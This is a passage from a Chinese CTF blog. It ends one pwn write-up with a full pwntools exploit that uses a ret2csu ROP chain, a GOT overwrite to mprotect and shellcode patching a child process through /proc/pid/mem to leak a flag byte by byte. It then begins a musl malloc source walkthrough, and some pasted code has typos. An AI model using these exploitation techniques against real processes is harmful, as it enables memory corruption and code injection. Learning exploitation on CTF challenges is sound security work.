ok\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>效果</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">rootzhang@ubuntu:~/get-shell/tscrf/pwn5$ ./pwnc</span><br><span class="line">/proc/6461/mem</span><br><span class="line">3</span><br><span class="line">555edf693000-555edf694000 r-xp 00000000 08:01 542793                     /home/rootzhang/get-shell/tscrf/pwn5/pwnc</span><br><span class="line">555edf894000-555edf895000 r--p 00001000 08:01 542793                     /home/rootzhang/get-shell/tscrf/pwn5/pwnc</span><br><span class="line">555edf895000-555edf896000 rw-p 00002000 08:01 542793                     /home/rootzhang/get-shell/tscrf/pwn5/pwnc</span><br><span class="line">555ee0f03000-555ee0f24000 rw-p 00000000 00:00 0                          [heap]</span><br><span class="line">7fcea4c50000-7fcea4e37000 r-xp 00000000 08:01 1192603                    /lib/x86_64-linux-gnu/libc-2.27.so</span><br><span class="line">7fcea4e37000-7fcea5037000 ---p 001e7000 08:01 1192603                    /lib/x86_64-linux-gnu/libc-2.27.so</span><br><span class="line">7fcea5037000-7fcea503b000 r--p 001e7000 08:01 1192603                    /lib/x86_64-linux-gnu/libc-2.27.so</span><br><span class="line">7fcea503b000-7fcea503d000 rw-p 001eb000 08:01 1192603                    /lib/x86_64-linux-gnu/libc-2.27.so</span><br><span class="line">7fcea503d000-7fcea5041000 rw-p 00000000 00:</span><br><span class="line">93865963502584</span><br><span class="line">追踪与中断点陷阱 (核心已转储)</span><br></pre></td></tr></table></figure>

<p>可见这个伪文件还是非常nb的，如果能对这个伪文件进行write的话，就可以忽视这个进行的各个段的权限进行任意篡改。</p>
<p>0x4.3 解题思路</p>
<p>1.首先是能够执行任意库函数，使用了我从未见过的gadget</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add [rbp-0x3d],ebx</span><br><span class="line">nop</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>

<p>只要控制了rbp和ebx就可以修改任意数据了了，这里修改got表的地址为syscall，然后使用plt跳到这个got表项就可以了。</p>
<p>2.把getpid的got改成mprotect，然后调用mprotect使得bss段rwx,然后跳到bss段</p>
<p>3.父进程调用调用open(‘/proc/pid/mem’,2,0)其中2代表是可写权限，然后调用lseek(fd,offset,0)把文件读写指针指导sleep后面的一个地址，然后write(fd,text,count),改写sleep()后面的代码，然后使用wait(-1,addr,0)等待这个子进程结束，这个子进程的返回值就是一个flag的字符，储存在addr+1的位置，最后使用write输出</p>
<p>其中有几个函数比较陌生</p>
<p><strong>lseek(int fd, off_t offset, int whence)</strong>:可以设置fd的当前读写指针，其中whence参数有三个</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SEEK_SET:0#从文件头部开始偏移offset个字节</span><br><span class="line">SEEK_CUR:1#从文件当前读写的指针位置开始，增加offset个字节的偏移量</span><br><span class="line">SEEK_END:2#文件偏移量设置为文件的大小加上偏移量字节</span><br></pre></td></tr></table></figure>

<p>**wait4 ( pid_t <em>pid</em>, int <strong>status*, int <em>option</em>, struct rusage *<em>ru</em> )</strong>,阻塞等待指定的子进程，然后把进程信息放在第二个参数的地方，如果pid=-1,则是等待所有子进程</p>
<p>4.子进程调用open(“./flag”,0),然后调用lseek(fd,offset,0)定位读写指针，然后调用read(fd,addr,1)读入一个flag,最后exit(*addr)把这个字符通过exit返回，这样父进程就可以通过wait()函数获得其返回值了。</p>
<h4 id="0x4-3-脚本"><a href="#0x4-3-脚本" class="headerlink" title="0x4.3 脚本"></a>0x4.3 脚本</h4><p>重点参考了官方wp和ayoung佬的脚本，不过现在好像也就这两个wp,第一次写这么多的汇编，而且还是多进程的，写的时候胆战心惊生怕写错,最后在write那里少赋值了rax耽误了一会，不过幸好问题不大。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">pop_rdi=<span class="number">0x0000000000401573</span></span><br><span class="line">pop_rsi_r15=<span class="number">0x0000000000401571</span></span><br><span class="line">duan=<span class="string">&#x27;b *(&#123;0&#125;)&#x27;</span>.<span class="built_in">format</span>(<span class="number">0x401505</span>)</span><br><span class="line"><span class="comment">#gdb.attach(sh,duan)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>(<span class="params">offset</span>):</span></span><br><span class="line">    sh=process([<span class="string">&#x27;/home/rootzhang/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/ld-2.31.so&#x27;</span>, <span class="string">&#x27;./pwn&#x27;</span>], env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:<span class="string">&#x27;/home/rootzhang/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/libc-2.31.so&#x27;</span>&#125;)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;/home/rootzhang/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/libc-2.31.so&#x27;</span>)</span><br><span class="line">    <span class="comment"># sh=process(&#x27;./pwn1&#x27;)</span></span><br><span class="line">    elf=ELF(<span class="string">&quot;./pwn1&quot;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Mute&#x27;s pid is &quot;</span>)</span><br><span class="line">    father_pid=<span class="built_in">int</span>(sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>))</span><br><span class="line">    parent_shellcode=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    /*open(&quot;/proc/pid/mem&quot;,2,0)*/</span></span><br><span class="line"><span class="string">    mov rdi, 0x4047e0</span></span><br><span class="line"><span class="string">    mov rsi,2</span></span><br><span class="line"><span class="string">    mov rdx, 0</span></span><br><span class="line"><span class="string">    mov rax, 2</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    /*lseek(3,offset,0)*/</span></span><br><span class="line"><span class="string">    mov rdi, rax</span></span><br><span class="line"><span class="string">    mov rsi, 0x4013B8</span></span><br><span class="line"><span class="string">    mov rdx, 0</span></span><br><span class="line"><span class="string">    mov rax, 8</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    /*write(fd,0x4042E0+0x300,0x70)*/</span></span><br><span class="line"><span class="string">    mov rsi, 0x4045e0</span></span><br><span class="line"><span class="string">    mov rdx,0x70</span></span><br><span class="line"><span class="string">    mov rax, 1</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    /*wait4(-1,0x4042E0+0x800,0,0)*/</span></span><br><span class="line"><span class="string">    mov rdi, 0xffffffffffffffff</span></span><br><span class="line"><span class="string">    mov rsi, 0x404ae0</span></span><br><span class="line"><span class="string">    mov rdx, 0</span></span><br><span class="line"><span class="string">    mov rcx, 0</span></span><br><span class="line"><span class="string">    mov rax, 61</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    /*write(1,0x4042E0+0x801,0x1)*/</span></span><br><span class="line"><span class="string">    mov rax, 1</span></span><br><span class="line"><span class="string">    mov rdi, 1</span></span><br><span class="line"><span class="string">    mov rsi,0x404ae1</span></span><br><span class="line"><span class="string">    mov rdx, 1</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    child_shellcode=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    /*open(&#x27;./flag&#x27;,0,0)*/</span></span><br><span class="line"><span class="string">    mov rax, 0x67616c662f2e</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    mov rdi, rsp</span></span><br><span class="line"><span class="string">    mov rsi, 0</span></span><br><span class="line"><span class="string">    mov rdx, 0</span></span><br><span class="line"><span class="string">    mov rax, 2</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    /*lseek(fd,offset,0)*/</span></span><br><span class="line"><span class="string">    mov rdi, rax</span></span><br><span class="line"><span class="string">    mov rsi, &#123;0&#125;</span></span><br><span class="line"><span class="string">    mov rdx, 0</span></span><br><span class="line"><span class="string">    mov rax, 8</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    /*read(fd,0x4042E0,1)*/</span></span><br><span class="line"><span class="string">    mov rsi, 0x4042E0</span></span><br><span class="line"><span class="string">    mov rdx, 1</span></span><br><span class="line"><span class="string">    mov rax, 0</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    /*exit(flag)*/</span></span><br><span class="line"><span class="string">    mov rdi, [rsi]</span></span><br><span class="line"><span class="string">    mov rax, 60</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(offset)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Maybe a Gift?&quot;</span>)</span><br><span class="line">    pay=asm(parent_shellcode)</span><br><span class="line">    pay=pay.ljust(<span class="number">0x300</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    pay+=asm(child_shellcode)</span><br><span class="line">    pay=pay.ljust(<span class="number">0x500</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    pay+=<span class="string">&#x27;/proc/&#x27;</span>+<span class="built_in">str</span>(father_pid+<span class="number">1</span>)+<span class="string">&#x27;/mem\x00&#x27;</span></span><br><span class="line">    sh.send(pay)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;A overflow?&quot;</span>)</span><br><span class="line">    csu1=<span class="number">0x40156A</span></span><br><span class="line">    csu2=<span class="number">0x401550</span></span><br><span class="line">    getpid_got=elf.got[<span class="string">&quot;getpid&quot;</span>]</span><br><span class="line">    pay=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x48</span>+p64(csu1)</span><br><span class="line">    pay+=p64(<span class="number">0x348e0</span>)+p64(getpid_got+<span class="number">0x3d</span>)</span><br><span class="line">    pay+=p64(<span class="number">0x404000</span>)+p64(<span class="number">0x1000</span>)</span><br><span class="line">    pay+=p64(<span class="number">7</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x40123c</span>)</span><br><span class="line">    pay+=p64(csu1)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)</span><br><span class="line">    pay+=p64(<span class="number">0x404000</span>)+p64(<span class="number">0x2000</span>)+p64(<span class="number">7</span>)</span><br><span class="line">    pay+=p64(<span class="number">0x404020</span>)+p64(csu2)</span><br><span class="line">    pay+=p64(<span class="number">0</span>)*<span class="number">7</span>+p64(<span class="number">0x4042E0</span>)</span><br><span class="line">    sh.send(pay)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    flag=sh.recv(<span class="number">1</span>)</span><br><span class="line">    sh.close()</span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>):</span><br><span class="line">    s=exp(i)</span><br><span class="line">    flag+=s</span><br><span class="line">    <span class="keyword">if</span> s==<span class="string">&quot;&#125;&quot;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span> flag</span><br></pre></td></tr></table></figure>


















      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/20/musl%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB-ctf%E5%89%8D%E4%B8%A4%E9%81%93pwn/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="rootzhang">
      <meta itemprop="description" content="我的博客">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="study">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/04/20/musl%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB-ctf%E5%89%8D%E4%B8%A4%E9%81%93pwn/" class="post-title-link" itemprop="url">musl源码阅读&*ctf前两道pwn</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2022-04-20 14:35:40 / 修改时间：14:36:30" itemprop="dateCreated datePublished" datetime="2022-04-20T14:35:40+08:00">2022-04-20</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="musl源码阅读-amp-ctf-前两道pwn"><a href="#musl源码阅读-amp-ctf-前两道pwn" class="headerlink" title="musl源码阅读&amp;*ctf 前两道pwn"></a>musl源码阅读&amp;*ctf 前两道pwn</h1><h2 id="0x1-源码"><a href="#0x1-源码" class="headerlink" title="0x1 源码"></a>0x1 源码</h2><h3 id="0x1-1-重要结构体"><a href="#0x1-1-重要结构体" class="headerlink" title="0x1.1 重要结构体"></a>0x1.1 重要结构体</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">truct chunk&#123;</span><br><span class="line"> <span class="keyword">char</span> prev_user_data[];</span><br><span class="line">    <span class="keyword">uint8_t</span> idx;  <span class="comment">//第5bit为idx第几个chunk</span></span><br><span class="line">    <span class="keyword">uint16_t</span> offset; <span class="comment">//与group的偏移</span></span><br><span class="line">    <span class="keyword">char</span> data[];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">group</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">meta</span>;</span><span class="comment">// meta的地址</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> active_idx:<span class="number">5</span>;</span><br><span class="line">    <span class="keyword">char</span> pad[UNIT - <span class="keyword">sizeof</span>(struct meta *) - <span class="number">1</span>];<span class="comment">// 保证0x10字节对齐</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> storage[];<span class="meta"># chunk</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">prev</span>, *<span class="title">next</span>;</span><span class="comment">//双向链表</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">group</span> *<span class="title">mem</span>;</span><span class="comment">// 这里指向管理的group 地址</span></span><br><span class="line">    <span class="keyword">volatile</span> <span class="keyword">int</span> avail_mask, freed_mask;</span><br><span class="line">    <span class="keyword">uintptr_t</span> last_idx:<span class="number">5</span>;</span><br><span class="line">    <span class="keyword">uintptr_t</span> freeable:<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">uintptr_t</span> sizeclass:<span class="number">6</span>;</span><br><span class="line">    <span class="keyword">uintptr_t</span> maplen:<span class="number">8</span>*<span class="keyword">sizeof</span>(<span class="keyword">uintptr_t</span>)<span class="number">-12</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> check;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">next</span>;</span></span><br><span class="line">    <span class="keyword">int</span> nslots;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> <span class="title">slots</span>[];</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_context</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> secret;<span class="comment">// 和meta_area 头的check 是同一个值 就是校验值</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> PAGESIZE</span></span><br><span class="line">    <span class="keyword">size_t</span> pagesize;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> init_done;<span class="comment">//是否初始化标记</span></span><br><span class="line">    <span class="keyword">unsigned</span> mmap_counter;<span class="comment">// 记录有多少mmap 的内存的数量</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">free_meta_head</span>;</span><span class="comment">// 被free 的meta 头 这里meta 管理使用了队列和双向循环链表</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">avail_meta</span>;</span><span class="comment">//指向可用meta数组</span></span><br><span class="line">    <span class="keyword">size_t</span> avail_meta_count, avail_meta_area_count, meta_alloc_shift;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">meta_area_head</span>, *<span class="title">meta_area_tail</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> *avail_meta_areas;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">active</span>[48];</span><span class="comment">// 记录着可用的meta</span></span><br><span class="line">    <span class="keyword">size_t</span> u sage_by_class[<span class="number">48</span>];</span><br><span class="line">    <span class="keyword">uint8_t</span> unmap_seq[<span class="number">32</span>], bounces[<span class="number">32</span>];</span><br><span class="line">    <span class="keyword">uint8_t</span> seq;</span><br><span class="line">    <span class="keyword">uintptr_t</span> brk;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">这是一个映射关系，meta.sizeclass就是这个size_classes的下标，通过这个下标</span><br><span class="line">把对应值取出来然后*<span class="number">0x10</span>就是这个meta管理的slot的大小了，同时malloc_context.active</span><br><span class="line">也是这个映射关系</span><br><span class="line">onst <span class="keyword">uint16_t</span> size_classes[] = &#123;</span><br><span class="line">    <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>,</span><br><span class="line">    <span class="number">9</span>, <span class="number">10</span>, <span class="number">12</span>, <span class="number">15</span>,</span><br><span class="line">    <span class="number">18</span>, <span class="number">20</span>, <span class="number">25</span>, <span class="number">31</span>,</span><br><span class="line">    <span class="number">36</span>, <span class="number">42</span>, <span class="number">50</span>, <span class="number">63</span>,</span><br><span class="line">    <span class="number">72</span>, <span class="number">84</span>, <span class="number">102</span>, <span class="number">127</span>,</span><br><span class="line">    <span class="number">146</span>, <span class="number">170</span>, <span class="number">204</span>, <span class="number">255</span>,</span><br><span class="line">    <span class="number">292</span>, <span class="number">340</span>, <span class="number">409</span>, <span class="number">511</span>,</span><br><span class="line">    <span class="number">584</span>, <span class="number">682</span>, <span class="number">818</span>, <span class="number">1023</span>,</span><br><span class="line">    <span class="number">1169</span>, <span class="number">1364</span>, <span class="number">1637</span>, <span class="number">2047</span>,</span><br><span class="line">    <span class="number">2340</span>, <span class="number">2730</span>, <span class="number">3276</span>, <span class="number">4095</span>,</span><br><span class="line">    <span class="number">4680</span>, <span class="number">5460</span>, <span class="number">6552</span>, <span class="number">8191</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>0x1.2 free</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">free</span><span class="params">(<span class="keyword">void</span> *p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (!p) <span class="keyword">return</span>;</span><br><span class="line">	<span class="comment">//通过chunkp得到对应的meta</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">g</span> =</span> get_meta(p);</span><br><span class="line">	<span class="keyword">int</span> idx = get_slot_index(p);</span><br><span class="line">	<span class="keyword">size_t</span> stride = get_stride(g);<span class="comment">//得到这个meta管理的group的slot的size</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> *start = g-&gt;mem-&gt;storage + stride*idx;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> *end = start + stride - IB;</span><br><span class="line">	<span class="comment">//*start = g-&gt;mem-&gt;storage(得到group中第一个chunk地址) + stride*idx(加上对应chunk偏移);</span></span><br><span class="line">    <span class="comment">// start 就为对应p(chunk)的起始地址</span></span><br><span class="line">    <span class="comment">// end 对应结束地址</span></span><br><span class="line">	get_nominal_size(p, end);</span><br><span class="line">    <span class="comment">//self得到bitmap对应的位置，all是得到bitmap全是1的数</span></span><br><span class="line">	<span class="keyword">uint32_t</span> self = <span class="number">1u</span>&lt;&lt;idx, all = (<span class="number">2u</span>&lt;&lt;g-&gt;last_idx)<span class="number">-1</span>;</span><br><span class="line">    <span class="comment">//把offsset设置为0xff，把idx清零</span></span><br><span class="line">	((<span class="keyword">unsigned</span> <span class="keyword">char</span> *)p)[<span class="number">-3</span>] = <span class="number">255</span>;</span><br><span class="line">	*(<span class="keyword">uint16_t</span> *)((<span class="keyword">char</span> *)p<span class="number">-2</span>) = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//没看懂在干啥</span></span><br><span class="line">	<span class="keyword">if</span> (((<span class="keyword">uintptr_t</span>)(start<span class="number">-1</span>) ^ (<span class="keyword">uintptr_t</span>)end) &gt;= <span class="number">2</span>*PGSZ &amp;&amp; g-&gt;last_idx) &#123;</span><br><span class="line">		<span class="keyword">unsigned</span> <span class="keyword">char</span> *base = start + (-(<span class="keyword">uintptr_t</span>)start &amp; (PGSZ<span class="number">-1</span>));</span><br><span class="line">		<span class="keyword">size_t</span> len = (end-base) &amp; -PGSZ;</span><br><span class="line">		<span class="keyword">if</span> (len) madvise(base, len, MADV_FREE);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// atomic free without locking if this is neither first or last slot</span></span><br><span class="line">	<span class="keyword">for</span> (;;) &#123;</span><br><span class="line">		<span class="keyword">uint32_t</span> freed = g-&gt;freed_mask;</span><br><span class="line">		<span class="keyword">uint32_t</span> avail = g-&gt;avail_mask;</span><br><span class="line">        <span class="comment">//mask中为1代表未分配或者已分配且已free的chunk，</span></span><br><span class="line">        <span class="comment">//为0代表已分配但还没free的cuhnk</span></span><br><span class="line">		<span class="keyword">uint32_t</span> mask = freed | avail;</span><br><span class="line">        <span class="comment">//防止doublefree</span></span><br><span class="line">		assert(!(mask&amp;self));</span><br><span class="line">		<span class="keyword">if</span> (!freed || mask+self==all) <span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">if</span> (!MT)</span><br><span class="line">			g-&gt;freed_mask = freed+self;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (a_cas(&amp;g-&gt;freed_mask, freed, freed+self)!=freed)</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	wrlock();</span><br><span class="line">    <span class="comment">//nontrivial_free是关键的函数</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mapinfo</span> <span class="title">mi</span> =</span> nontrivial_free(g, idx);</span><br><span class="line">	unlock();</span><br><span class="line">	<span class="keyword">if</span> (mi.len) munmap(mi.base, mi.len);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> struct mapinfo <span class="title">nontrivial_free</span><span class="params">(struct meta *g, <span class="keyword">int</span> 